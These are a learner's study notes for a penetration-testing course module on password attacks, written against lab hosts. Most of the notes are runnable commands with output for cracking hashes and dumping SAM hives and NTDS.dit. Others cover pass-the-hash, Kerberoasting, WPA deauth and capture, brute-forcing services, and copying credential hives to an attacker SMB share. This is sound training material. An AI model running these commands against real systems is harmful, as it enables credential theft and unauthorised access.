# Password Attacks

**Platform:** Hack The Box Academy  
**Module:** Password Attacks  
**Sections:** 26  
**Difficulty:** Medium  
**Category:** Offensive Security / Credential Access  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Table of Contents

1. [Overview](#overview)
2. [Password Cracking Fundamentals](#password-cracking-fundamentals)
   - [Hashing and Salting](#hashing-and-salting)
   - [Rainbow Tables](#rainbow-tables)
   - [Brute-Force Attacks](#brute-force-attacks)
   - [Dictionary Attacks](#dictionary-attacks)
3. [John the Ripper (JtR)](#john-the-ripper-jtr)
   - [Cracking Modes](#cracking-modes)
   - [Hash Format Identification](#hash-format-identification)
   - [Cracking Protected Files](#cracking-protected-files)
   - [Cracking Protected Archives](#cracking-protected-archives)
4. [Hashcat](#hashcat)
   - [Attack Modes](#attack-modes)
   - [Mask Attack](#mask-attack)
5. [Custom Wordlists and Rules](#custom-wordlists-and-rules)
   - [Hashcat Rules](#hashcat-rules)
   - [CeWL â€” Website Wordlist Generation](#cewl--website-wordlist-generation)
6. [Windows Credential Storage](#windows-credential-storage)
   - [SAM Database](#sam-database)
   - [Credential Manager](#credential-manager)
   - [NTDS](#ntds)
7. [Attacking Windows Credentials](#attacking-windows-credentials)
   - [Dumping SAM, SYSTEM, and SECURITY Hives](#dumping-sam-system-and-security-hives)
   - [Pass-the-Hash (PtH)](#pass-the-hash-pth)
   - [Dumping NTDS.dit](#dumping-ntdsdit)
8. [Linux Credential Storage](#linux-credential-storage)
   - [/etc/passwd and /etc/shadow](#etcpasswd-and-etcshadow)
   - [Cracking Linux Credentials](#cracking-linux-credentials)
9. [Credential Hunting on Linux](#credential-hunting-on-linux)
10. [Credential Hunting on Windows](#credential-hunting-on-windows)
11. [Network-Based Attacks](#network-based-attacks)
    - [WPA/WPA2 Cracking](#wpawpa2-cracking)
    - [Attacking Network Services](#attacking-network-services)
12. [Kerberos Attacks](#kerberos-attacks)
    - [Pass-the-Ticket (PtT)](#pass-the-ticket-ptt)
    - [AS-REP Roasting](#as-rep-roasting)
    - [Kerberoasting](#kerberoasting)
13. [Password Managers](#password-managers)
14. [Key Tools Reference](#key-tools-reference)
15. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

Authentication is the validation of identity through one or more of four factors: something you know (password/PIN), something you have (smart card/token), something you are (biometrics), and somewhere you are (geolocation/IP). Passwords remain the most widespread authentication method despite being the most attackable. This module covers attacking and bypassing password-based authentication across operating systems, applications, and encryption formats.

Key statistics that shape our approach:

- `123456` is still the most common password, appearing 4.5 million times in breach data
- 23%+ of users reuse passwords across three or more accounts
- 66% of Americans reuse the same password across multiple platforms â€” a single cracked credential often opens multiple doors
- Only 45% of users change passwords after a data breach, leaving 55% with known-compromised credentials

---

## Password Cracking Fundamentals

### Hashing and Salting

Passwords are stored as hashes â€” one-way mathematical transformations that cannot (in theory) be reversed. Common algorithms include MD5, SHA-1, SHA-256, SHA-512, and bcrypt.

```bash
# Generate MD5 hash
Hackerpatel007_1@htb[/htb]$ echo -n Soccer06! | md5sum
40291c1d19ee11a7df8495c4cccefdfa  -

# Generate SHA-256 hash
Hackerpatel007_1@htb[/htb]$ echo -n Soccer06! | sha256sum
a025dc6fabb09c2b8bfe23b5944635f9b68433ebd9a1a09453dd4fee00766d93  -
```

**Salting** adds a random byte sequence to a password before hashing to defeat rainbow tables. The salt is stored alongside the hash so the system can verify future login attempts.

```bash
# Salted MD5 â€” same password, completely different hash
Hackerpatel007_1@htb[/htb]$ echo -n Th1sIsTh3S@lt_Soccer06! | md5sum
90a10ba83c04e7996bc53373170b5474  -
```

---

### Rainbow Tables

Pre-computed lookup tables mapping plaintext passwords to their hashes. Extremely fast but defeated by salting â€” a salt of even one byte multiplies the required table size by 256.

---

### Brute-Force Attacks

Attempts every possible character combination. Guaranteed to crack any password given enough time but impractical for long/complex passwords. Usually replaced by more efficient **mask attacks** in practice.

> **Note:** On a typical laptop, Hashcat can test over 5 million MD5 candidates per second, but only ~10,000 DCC2 candidates per second. Algorithm choice dramatically affects cracking speed.

---

### Dictionary Attacks

Uses statistically likely passwords from a wordlist. The most efficient technique in time-constrained engagements.

```bash
# Preview rockyou.txt â€” 14+ million real-world leaked passwords
Hackerpatel007_1@htb[/htb]$ head --lines=20 /usr/share/wordlists/rockyou.txt

123456
12345
123456789
password
iloveyou
<SNIP>
```

---

## John the Ripper (JtR)

Open-source password cracker first released in 1996. The **jumbo** variant is recommended â€” it has performance optimisations, multilingual wordlists, and 64-bit support. JtR ships with dozens of `*2john` conversion scripts for extracting crackable hashes from files.

### Cracking Modes

| Mode | Description |
|------|-------------|
| **Single crack** | Rule-based â€” generates candidates from username, home dir, GECOS fields. Best for Linux credentials. |
| **Wordlist** | Dictionary attack against a supplied wordlist. Rules can be applied for transformations. |
| **Incremental** | Markov-chain statistical brute force. Exhaustive but slow. Prioritises statistically likely passwords. |

```bash
# Single crack mode â€” uses metadata from the passwd file to generate candidates
Hackerpatel007_1@htb[/htb]$ john --single passwd

# Wordlist mode with rules
Hackerpatel007_1@htb[/htb]$ john --wordlist=rockyou.txt --rules=best64 hash.txt

# Incremental mode
Hackerpatel007_1@htb[/htb]$ john --incremental hash.txt

# Show cracked passwords
Hackerpatel007_1@htb[/htb]$ john hash.txt --show
```

---

### Hash Format Identification

```bash
# Use hashID to identify format â€” -j flag adds JtR format string
Hackerpatel007_1@htb[/htb]$ hashid -j 193069ceb0461e1d40d216e32c79c704

Analyzing '193069ceb0461e1d40d216e32c79c704'
[+] MD5 [JtR Format: raw-md5]
[+] NTLM [JtR Format: nt]
[+] Domain Cached Credentials 2 [JtR Format: mscach2]
<SNIP>

# Specify format explicitly if auto-detection fails
Hackerpatel007_1@htb[/htb]$ john --format=raw-md5 --wordlist=rockyou.txt hash.txt
```

---

### Cracking Protected Files

JtR includes `*2john` scripts to extract crackable hashes from protected files.

```bash
# List all available 2john conversion scripts
Hackerpatel007_1@htb[/htb]$ locate *2john*

# Crack password-protected SSH private key
Hackerpatel007_1@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
Hackerpatel007_1@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash
Hackerpatel007_1@htb[/htb]$ john ssh.hash --show

SSH.private:1234

# Crack password-protected Word document
Hackerpatel007_1@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
Hackerpatel007_1@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
Hackerpatel007_1@htb[/htb]$ john protected-docx.hash --show

Protected.docx:1234

# Crack password-protected PDF
Hackerpatel007_1@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
Hackerpatel007_1@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
```

**Hunting for encrypted files on Linux:**

```bash
Hackerpatel007_1@htb[/htb]$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
  echo -e "\nFile extension: " $ext
  find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Hunt for SSH private keys by content signature
Hackerpatel007_1@htb[/htb]$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----

# Check whether an SSH key is passphrase-protected
Hackerpatel007_1@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_rsa
Enter passphrase for "/home/jsmith/.ssh/id_rsa":
```

---

### Cracking Protected Archives

```bash
# Crack ZIP archive
Hackerpatel007_1@htb[/htb]$ zip2john ZIP.zip > zip.hash
Hackerpatel007_1@htb[/htb]$ john --wordlist=rockyou.txt zip.hash
Hackerpatel007_1@htb[/htb]$ john zip.hash --show

ZIP.zip/customers.csv:1234

# Crack OpenSSL-encrypted GZIP â€” bash loop approach (JtR unreliable here)
Hackerpatel007_1@htb[/htb]$ for i in $(cat rockyou.txt); do
  openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz
done
```

---

## Hashcat

Open-source GPU-accelerated password cracker supporting hundreds of hash types. Significantly faster than JtR for GPU-capable hardware.

```bash
# General syntax
Hackerpatel007_1@htb[/htb]$ hashcat -a <attack_mode> -m <hash_type> <hashes> [wordlist/mask/rule]

# Identify hash type with hashID â€” -m flag adds Hashcat mode number
Hackerpatel007_1@htb[/htb]$ hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'

[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
```

### Attack Modes

| Mode | Flag | Description |
|------|------|-------------|
| Dictionary | `-a 0` | Wordlist attack, with optional rules |
| Combination | `-a 1` | Combines two wordlists |
| Mask | `-a 3` | Explicit keyspace brute force |
| Association | `-a 9` | Uses username/target info as hints |

```bash
# Dictionary attack â€” MD5 hash with rockyou.txt
Hackerpatel007_1@htb[/htb]$ hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt

# Dictionary attack with best64 ruleset
Hackerpatel007_1@htb[/htb]$ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# List available rulesets
Hackerpatel007_1@htb[/htb]$ ls -l /usr/share/hashcat/rules
```

---

### Mask Attack

Defines the exact keyspace using built-in character sets. Much more efficient than pure brute force when password structure is partially known.

| Symbol | Charset |
|--------|---------|
| `?l` | a-z (lowercase) |
| `?u` | A-Z (uppercase) |
| `?d` | 0-9 (digits) |
| `?s` | Special characters |
| `?a` | All printable characters (`?l?u?d?s`) |
| `?h` | Hex lowercase (0-9a-f) |
| `?H` | Hex uppercase (0-9A-F) |

Custom charsets can be defined with `-1`, `-2`, `-3`, `-4` and referenced as `?1`, `?2`, `?3`, `?4`.

```bash
# Crack a hash with pattern: uppercase + 4 lowercase + digit + symbol
Hackerpatel007_1@htb[/htb]$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Speed.#1.........:   101.6 MH/s (9.29ms)
Recovered........: 1/1 (100.00%) Digests
```

---

## Custom Wordlists and Rules

Users follow predictable patterns even with complex policies. Common additions: capitalised first letter, appended year/month, trailing `!`, leet substitutions (`aâ†’@`, `oâ†’0`).

### Hashcat Rules

```bash
# Example custom rule file
Hackerpatel007_1@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@

# Generate mutated wordlist from a single base word
Hackerpatel007_1@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

Hackerpatel007_1@htb[/htb]$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
<SNIP>
```

**Rule function reference:**

| Function | Description |
|----------|-------------|
| `:` | Do nothing |
| `l` | Lowercase all letters |
| `u` | Uppercase all letters |
| `c` | Capitalise first letter |
| `sXY` | Replace all X with Y |
| `$!` | Append `!` at end |

---

### CeWL â€” Website Wordlist Generation

```bash
# Spider a company website and extract words as a custom wordlist
Hackerpatel007_1@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

Hackerpatel007_1@htb[/htb]$ wc -l inlane.wordlist
326
```

Apply Hashcat rules to the CeWL list for a targeted, high-probability wordlist specific to the target organisation.

---

## Windows Credential Storage

### SAM Database

The Security Account Manager (SAM) stores local user account hashes at `%SystemRoot%\system32\config\SAM`, mounted under `HKLM\SAM`. Requires SYSTEM privileges to access. Since Windows NT 4.0, **SYSKEY** partially encrypts the SAM on disk â€” the boot key from `HKLM\SYSTEM` is required to decrypt it.

Hash formats stored:
- **LM hash** â€” legacy (pre-Vista/Server 2008), weak, easily cracked
- **NT hash** â€” modern standard, used for Pass-the-Hash

### Credential Manager

Stores saved credentials (RDP, network shares, websites) per user profile, encrypted at:

```
C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```

### NTDS

Domain Controllers store all domain credentials in `%SystemRoot%\ntds.dit`. This file contains all user account hashes, group accounts, computer accounts, and Group Policy Objects across the domain. Extracting NTDS.dit is one of the highest-impact actions achievable on an engagement.

---

## Attacking Windows Credentials

### Dumping SAM, SYSTEM, and SECURITY Hives

```cmd
# Save registry hives with admin privileges
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

**Exfiltrate hives via Impacket SMB share:**

```bash
# Start SMB share on attack host
Hackerpatel007_1@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

```cmd
# Move hives to share from target
C:\> move sam.save \\10.10.15.16\CompData
C:\> move security.save \\10.10.15.16\CompData
C:\> move system.save \\10.10.15.16\CompData
```

**Dump hashes offline with secretsdump:**

```bash
Hackerpatel007_1@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  -sam sam.save -security security.save -system system.save LOCAL

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
<SNIP>
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
```

**Crack NT hashes with Hashcat (mode 1000):**

```bash
Hackerpatel007_1@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme
184ecdda8cf1dd238d438c4aea4d560d:adrian
```

**DCC2 hashes** (cached domain credentials from `HKLM\SECURITY`) use PBKDF2 and are significantly harder to crack. They cannot be used for Pass-the-Hash. Crack with Hashcat mode 2100.

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' rockyou.txt
```

---

### Pass-the-Hash (PtH)

With a valid NT hash, authentication to remote services is possible without knowing the plaintext password. The hash is used directly in the authentication protocol.

```bash
# PtH with Impacket's psexec â€” get SYSTEM shell
Hackerpatel007_1@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# PtH with CrackMapExec â€” spray across multiple hosts
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.201.0/24 -u administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# PtH with Evil-WinRM â€” WinRM remote management
Hackerpatel007_1@htb[/htb]$ evil-winrm -i 10.129.201.126 -u administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

# PtH with xfreerdp â€” RDP session
Hackerpatel007_1@htb[/htb]$ xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

> **Note:** PtH with RDP requires the target to have `Restricted Admin Mode` enabled or the user must be a local administrator.

---

### Dumping NTDS.dit

The NTDS.dit file on a Domain Controller contains all domain hashes. Requires DA or equivalent privileges.

```bash
# Method 1 â€” secretsdump remotely (requires DA credentials or hash)
Hackerpatel007_1@htb[/htb]$ secretsdump.py -just-dc inlanefreight/administrator:"Password123!"@10.129.201.57

inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
inlanefreight.local\guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>
```

```cmd
# Method 2 â€” VSS shadow copy (local on DC)
C:\> vssadmin CREATE SHADOW /For=C:
C:\> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
C:\> reg.exe save hklm\SYSTEM C:\NTDS\SYSTEM
```

---

## Linux Credential Storage

### /etc/passwd and /etc/shadow

`/etc/passwd` â€” readable by all users, stores account metadata. The password field shows `x`, indicating the hash is stored in `/etc/shadow`.

```
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

`/etc/shadow` â€” readable only by root, stores password hashes in the format:

```
$<id>$<salt>$<hash>
```

| ID | Algorithm |
|----|-----------|
| `1` | MD5 |
| `2a` | Blowfish |
| `5` | SHA-256 |
| `6` | SHA-512 |
| `y` | Yescrypt (modern default on Debian-based) |

`/etc/security/opasswd` â€” stores previous passwords (managed by PAM `pam_unix.so`) to prevent reuse. Often contains older MD5 hashes that are easier to crack.

```bash
Hackerpatel007_1@htb[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

---

### Cracking Linux Credentials

```bash
# Combine passwd and shadow into a single crackable file
Hackerpatel007_1@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak
Hackerpatel007_1@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak
Hackerpatel007_1@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Crack SHA-512 hashes (mode 1800)
Hackerpatel007_1@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

> JtR's single crack mode was specifically designed for this unshadowed format â€” it uses account metadata to generate targeted candidates.

---

## Credential Hunting on Linux

After gaining a foothold, systematically search for credentials across four categories: files, history, memory, and key-rings.

**Configuration files:**

```bash
# Search for .conf, .config, .cnf files containing credentials
Hackerpatel007_1@htb[/htb]$ for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Grep credential keywords from .cnf files
Hackerpatel007_1@htb[/htb]$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: " $i
  grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
done
```

**Database files:**

```bash
Hackerpatel007_1@htb[/htb]$ for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

**Scripts (common credential containers):**

```bash
Hackerpatel007_1@htb[/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

**Shell history:**

```bash
Hackerpatel007_1@htb[/htb]$ cat ~/.bash_history | grep -i "pass\|user\|cred\|secret"
```

**SSH keys:**

```bash
Hackerpatel007_1@htb[/htb]$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

---

## Credential Hunting on Windows

**PowerShell history:**

```powershell
PS C:\htb> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Saved credentials (cmdkey):**

```cmd
C:\htb> cmdkey /list
C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

**Unattend.xml:**

```cmd
C:\htb> type C:\Windows\Panther\unattend.xml
```

**AutoLogon registry keys:**

```cmd
C:\htb> reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

**Browser credentials with LaZagne:**

```powershell
PS C:\htb> .\lazagne.exe all
PS C:\htb> .\lazagne.exe browsers
```

**Sticky Notes SQLite database:**

```powershell
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

---

## Network-Based Attacks

### WPA/WPA2 Cracking

```bash
# Capture WPA handshake with airodump-ng
Hackerpatel007_1@htb[/htb]$ sudo airodump-ng -c 1 --bssid <BSSID> -w capture wlan0

# Deauth a client to force handshake
Hackerpatel007_1@htb[/htb]$ sudo aireplay-ng --deauth 1 -a <BSSID> -c <CLIENT_MAC> wlan0

# Crack the handshake
Hackerpatel007_1@htb[/htb]$ aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Alternatively convert for Hashcat (mode 22000)
Hackerpatel007_1@htb[/htb]$ hcxpcapngtool capture-01.cap -o hash.hc22000
Hackerpatel007_1@htb[/htb]$ hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

### Attacking Network Services

**Password spraying and brute forcing with Hydra and Medusa:**

```bash
# SSH brute force
Hackerpatel007_1@htb[/htb]$ hydra -l user -P rockyou.txt ssh://10.129.42.197

# FTP brute force
Hackerpatel007_1@htb[/htb]$ hydra -l user -P rockyou.txt ftp://10.129.42.197

# RDP brute force
Hackerpatel007_1@htb[/htb]$ hydra -L users.txt -P rockyou.txt rdp://10.129.42.197

# HTTP form-based login brute force
Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt 10.129.42.197 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Medusa for SMB
Hackerpatel007_1@htb[/htb]$ medusa -u bwilliamson -P /usr/share/wordlists/fasttrack.txt -h 10.129.203.7 -M smb
```

> **Caution:** Brute-force attacks trigger account lockout policies. Always confirm the lockout threshold before spraying.

---

## Kerberos Attacks

### Pass-the-Ticket (PtT)

Kerberos tickets (TGTs and TGSs) stored in LSASS memory can be exported and reused to authenticate as the ticket owner without knowing the password.

```cmd
# Export all tickets with Mimikatz
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# Alternatively with Rubeus (Base64 output)
c:\tools> Rubeus.exe dump /nowrap

# Import a .kirbi ticket for use
mimikatz # kerberos::ptt [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# Verify ticket is loaded
c:\tools> klist
```

```bash
# Pass-the-Ticket on Linux with impacket
Hackerpatel007_1@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
Hackerpatel007_1@htb[/htb]$ impacket-psexec DC01 -k
```

---

### AS-REP Roasting

Targets accounts with **Kerberos pre-authentication disabled** (`DONT_REQ_PREAUTH` flag). The KDC returns an AS-REP encrypted with the user's hash â€” crackable offline.

```bash
# From Linux â€” enumerate and retrieve AS-REP hashes
Hackerpatel007_1@htb[/htb]$ GetNPUsers.py inlanefreight.htb/ -dc-ip 10.129.205.35 \
  -usersfile valid_users.txt -format hashcat -outputfile ASREPRoast.txt

Hackerpatel007_1@htb[/htb]$ hashcat -m 18200 ASREPRoast.txt /usr/share/wordlists/rockyou.txt
```

```powershell
# From Windows with Rubeus
c:\tools> Rubeus.exe asreproast /user:TestMail /format:hashcat /outfile:ASREPRoast.txt

PS C:\htb> hashcat -m 18200 'ASREPRoast.txt' /usr/share/wordlists/rockyou.txt
```

---

### Kerberoasting

Requests TGS tickets for accounts with **SPNs registered** (service accounts). The TGS is encrypted with the service account's NT hash and can be cracked offline.

```bash
# From Linux
Hackerpatel007_1@htb[/htb]$ GetUserSPNs.py -request -dc-ip 10.129.205.35 \
  inlanefreight.htb/forend

# Crack the TGS hash (mode 13100 = Kerberos TGS-REP)
Hackerpatel007_1@htb[/htb]$ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

```powershell
# From Windows with Rubeus
c:\tools> Rubeus.exe kerberoast /outfile:kerberoasted.txt

PS C:\htb> hashcat -m 13100 kerberoasted.txt /usr/share/wordlists/rockyou.txt
```

---

## Password Managers

### How Cloud Password Managers Work

Cloud password managers (Bitwarden, 1Password, Dashlane, LastPass) derive encryption keys from a master password using a KDF such as PBKDF2-SHA256:

1. **Master key** â€” derived from master password via KDF
2. **Master password hash** â€” used to authenticate to the cloud service
3. **Decryption key** â€” derived from master key, used to decrypt vault items with AES-256

Zero-Knowledge Encryption means the provider never sees the vault contents â€” only the encrypted blob.

### Local Password Managers

KeePass, KWalletManager, Password Safe â€” encrypt the database locally using similar KDFs with random salts. Offline and under full user control.

```bash
# Extract KeePass database hash for cracking
Hackerpatel007_1@htb[/htb]$ keepass2john ILFREIGHT_Help_Desk.kdbx > keepass.hash

# Crack with Hashcat (mode 13400 = KeePass)
Hackerpatel007_1@htb[/htb]$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```

---

## Key Tools Reference

| Command | Purpose |
|---------|---------|
| `hashid -j <hash>` | Identify hash format with JtR format string |
| `hashid -m <hash>` | Identify hash format with Hashcat mode number |
| `john --single passwd` | Single crack mode using account metadata |
| `john --wordlist=rockyou.txt hash.txt` | JtR wordlist attack |
| `john --incremental hash.txt` | JtR incremental brute force |
| `john hash.txt --show` | Display cracked passwords |
| `ssh2john.py key > hash && john hash` | Crack SSH key passphrase |
| `office2john.py doc.docx > hash` | Extract hash from Office document |
| `zip2john file.zip > hash` | Extract hash from ZIP archive |
| `keepass2john db.kdbx > hash` | Extract KeePass database hash |
| `unshadow passwd shadow > unshadowed` | Combine Linux passwd/shadow files |
| `hashcat -a 0 -m 0 hash rockyou.txt` | Hashcat dictionary attack (MD5) |
| `hashcat -a 3 -m 0 hash '?u?l?l?l?d?s'` | Hashcat mask attack |
| `hashcat -m 1000 hash rockyou.txt` | Crack NT hashes |
| `hashcat -m 1800 hash rockyou.txt` | Crack SHA-512crypt (Linux shadow) |
| `hashcat -m 13100 hash rockyou.txt` | Crack Kerberos TGS-REP (Kerberoasting) |
| `hashcat -m 18200 hash rockyou.txt` | Crack AS-REP (AS-REP Roasting) |
| `hashcat -m 13400 hash rockyou.txt` | Crack KeePass master password |
| `hashcat -m 2100 hash rockyou.txt` | Crack DCC2 (cached domain credentials) |
| `hashcat -m 22000 hash rockyou.txt` | Crack WPA/WPA2 handshake |
| `cewl <url> -d 4 -m 6 --lowercase -w list.txt` | Generate wordlist from website |
| `hashcat --force base.list -r custom.rule --stdout \| sort -u > mut.list` | Generate mutated wordlist |
| `reg.exe save hklm\sam C:\sam.save` | Save SAM registry hive |
| `secretsdump.py -sam sam -system system LOCAL` | Dump hashes from registry hives offline |
| `impacket-psexec user@ip -hashes :NThash` | Pass-the-Hash remote shell |
| `crackmapexec smb <subnet> -u user -H NThash` | Spray PtH across network |
| `GetUserSPNs.py -request -dc-ip <ip> domain/user` | Kerberoasting |
| `GetNPUsers.py domain/ -usersfile users.txt -format hashcat` | AS-REP Roasting |
| `Rubeus.exe dump /nowrap` | Export Kerberos tickets from LSASS |
| `mimikatz # sekurlsa::tickets /export` | Export Kerberos tickets to .kirbi files |
| `hydra -l user -P rockyou.txt ssh://<ip>` | SSH brute force |
| `hydra -L users.txt -P rockyou.txt rdp://<ip>` | RDP brute force |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1110 | T1110.001 | Brute Force: Password Guessing (Hydra, Medusa network spraying) |
| T1110 | T1110.002 | Brute Force: Password Cracking (Hashcat, JtR offline cracking) |
| T1110 | T1110.003 | Brute Force: Password Spraying (CrackMapExec domain spraying) |
| T1003 | T1003.001 | OS Credential Dumping: LSASS Memory (Mimikatz sekurlsa) |
| T1003 | T1003.002 | OS Credential Dumping: SAM (reg.exe + secretsdump) |
| T1003 | T1003.003 | OS Credential Dumping: NTDS (DC shadow copy / secretsdump) |
| T1003 | T1003.008 | OS Credential Dumping: /etc/passwd and /etc/shadow |
| T1550 | T1550.002 | Use Alternate Authentication Material: Pass-the-Hash |
| T1550 | T1550.003 | Use Alternate Authentication Material: Pass-the-Ticket |
| T1558 | T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting |
| T1558 | T1558.004 | Steal or Forge Kerberos Tickets: AS-REP Roasting |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files |
| T1552 | T1552.002 | Unsecured Credentials: Credentials in Registry |
| T1555 | T1555.003 | Credentials from Password Stores: Web Browsers |
| T1555 | T1555.005 | Credentials from Password Stores: Password Managers |
| T1040 | â€” | Network Sniffing (WPA handshake capture with airodump-ng) |
| T1078 | T1078.001 | Valid Accounts: Default Accounts |
| T1078 | T1078.002 | Valid Accounts: Domain Accounts (cracked AD credentials) |

---

*Module completed as part of the HTB Academy CPTS path.*  
*Penetration Tester role in India | Target: January 2027*
